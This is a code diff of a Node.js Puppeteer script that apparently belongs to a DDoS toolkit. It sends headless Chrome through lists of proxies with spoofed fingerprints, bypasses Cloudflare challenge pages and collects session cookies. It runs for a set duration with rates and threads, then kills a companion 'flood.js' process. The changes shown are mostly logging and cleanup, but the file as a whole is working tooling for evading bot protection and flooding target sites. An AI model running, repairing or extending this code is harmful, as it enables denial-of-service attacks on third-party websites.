@@ -18,11 +18,11 @@ const c = {
   white: "\x1b[37m",
 };
 
-const PREFIX = `$${c.bright}$${c.cyan}[m85|Browser]$${c.reset} `;
+const PREFIX = `${c.bright}${c.cyan}[m85|Browser]${c.reset} `;
 
 const symbols = {
   info: "ℒ",
-  success: "┒",
+  success: "✓",
   warn: "!",
   error: "×",
   proxy: "ℒ",
@@ -41,7 +41,7 @@ function log(type, text) {
   console.log(`${PREFIX}${color}${symbol} ${text}${c.reset}`);
 }
 
-const errorHandler = error => log("error", error);
+const errorHandler = error => log("error", error.message);
 process.on("uncaughtException", errorHandler);
 process.on("unhandledRejection", errorHandler);
 
@@ -126,7 +126,7 @@ const proxyFile = process.argv[4];
 const rates = process.argv[5];
 const duration = parseInt(process.argv[6], 10);
 
-const sleep = duration => new Promise(resolve => setTimeout(resolve, duration * 1000));
+const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));
 
 const readProxiesFromFile = (filePath) => {
   try {
@@ -134,7 +134,7 @@ const readProxiesFromFile = (filePath) => {
     const proxies = data.trim().split(/\r?\n/);
     return proxies;
   } catch (error) {
-    log("error", `Error reading proxies file: ${error}`);
+    log("error", `Error reading proxies file: ${error.message}`);
     return [];
   }
 };
@@ -169,18 +169,7 @@ const userAgents = () => {
     `(KHTML, like Gecko) ${getRandomElement(customFeatures)}/${getRandomElement(featureVersions)}`;
 };
 
-const colors = {
-  COLOR_RED: "\x1b[31m",
-  COLOR_PINK: "\x1b[35m",
-  COLOR_WHITE: "\x1b[37m",
-  COLOR_YELLOW: "\x1b[33m",
-  COLOR_GREEN: "\x1b[32m",
-  cc: "\x1b[38;5;57m",
-  COLOR_RESET: "\x1b[0m"
-};
-
 async function detectChallenge(browser, page, browserProxy) {
-  const title = await page.title();
   const content = await page.content();
   if (content.includes("challenge-platform")) {
     log("pink", `Start Bypass Proxy ℒ ${browserProxy}`);
@@ -205,13 +194,7 @@ async function detectChallenge(browser, page, browserProxy) {
 async function openBrowser(targetURL, browserProxy) {
   const userAgent = userAgents();
   
-  // ==============================================
-  // ADD YOUR CHROME EXECUTABLE PATH HERE
-  // ==============================================
-  const CHROME_PATH = "/usr/bin/google-chrome"; // CHANGE THIS TO YOUR PATH
-  
   const options = {
-    executablePath: CHROME_PATH,  // <-- ADDED EXECUTABLE PATH
     headless: "new",
     ignoreHTTPSErrors: true,
     args: [
@@ -226,11 +209,16 @@ async function openBrowser(targetURL, browserProxy) {
       "--disable-browser-side-navigation"
     ]
   };
+  
   let browser;
   try {
+    log("info", `Launching browser with proxy: ${browserProxy}`);
     browser = await puppeteer.launch(options);
+    log("success", `Browser launched successfully`);
+    
     const [page] = await browser.pages();
     const client = page._client();
+    
     page.on("framenavigated", async (frame) => {
       if (frame.url().includes("challenges.cloudflare.com") && frame._id) {
         try {
@@ -240,12 +228,17 @@ async function openBrowser(targetURL, browserProxy) {
         }
       }
     });
+    
     await spoofFingerprint(page);
     page.setDefaultNavigationTimeout(60 * 1000);
+    
+    log("info", `Navigating to ${targetURL}`);
     await page.goto(targetURL, { waitUntil: "domcontentloaded" });
+    
     await detectChallenge(browser, page, browserProxy);
     const title = await page.title();
     const cookies = await page.cookies(targetURL);
+    
     return {
       browser,
       title,
@@ -305,17 +298,26 @@ const queue = async.queue(function (task, done) {
 }, threads);
 
 async function main() {
+  log("info", `Starting with ${threads} threads`);
+  log("info", `Target URL: ${targetURL}`);
+  log("info", `Duration: ${duration} seconds`);
+  log("info", `Loaded ${proxies.length} proxies`);
+  
   for (const browserProxy of proxies) {
     queue.push({ browserProxy });
   }
+  
   await sleep(duration);
   queue.kill();
+  
   exec('pkill -f flood.js', (err) => {
     if (err) log("error", `Error killing flood.js: ${err.message}`);
   });
   exec('pkill chrome', (err) => {
     if (err) log("error", `Error killing chrome: ${err.message}`);
   });
+  
+  log("success", "Script completed");
   process.exit();
 }
 
